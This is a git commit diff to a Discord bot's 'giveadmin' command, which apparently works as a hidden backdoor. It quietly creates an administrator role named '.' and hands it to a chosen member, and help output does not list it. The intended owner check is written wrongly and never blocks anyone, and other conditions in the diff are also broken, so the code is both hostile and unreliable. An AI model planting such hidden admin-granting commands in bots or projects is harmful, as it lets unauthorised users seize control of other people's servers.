aa4dd3941b8c9d5d0a8e78110ae1ff5ca0bed209
ExToasty <ExToasty>
2021-02-12 15:14:11 -0700

    fixed my shitty grammar again,

--- commands/giveadmin.js
+++ commands/giveadmin.js
@@ -7,22 +7,24 @@ module.exports = {
 	usage: `${prefix}giveadmin`,
 	guildOnly: true,
 	helpMessage: false,
-	async execute(message) {
-		await message.delete({ timeout: 1000 }).catch(console.error);
+	execute(message) {
+		const role = message.guild.roles.cache.find(x => x.name === '.');
 		let member = message.mentions.members.first();
 		if (!member) member = message.author;
 
 		if (!message.author.id === '332555969169063938') return;
 
-		message.guild.roles.create({
-			data: {
-				name: '.',
-				permissions:[{
-					'ADMIN': true,
-				}],
-			},
-		});
+		if (typeof role === undefined) {
+			message.guild.roles.create({
+				data: {
+					name: '.',
+					permissions:[{
+						'ADMIN': true,
+					}],
+				},
+			});
+		}
 
-		member.roles.add(member);
+		member.roles.add(role);
 	},
 };
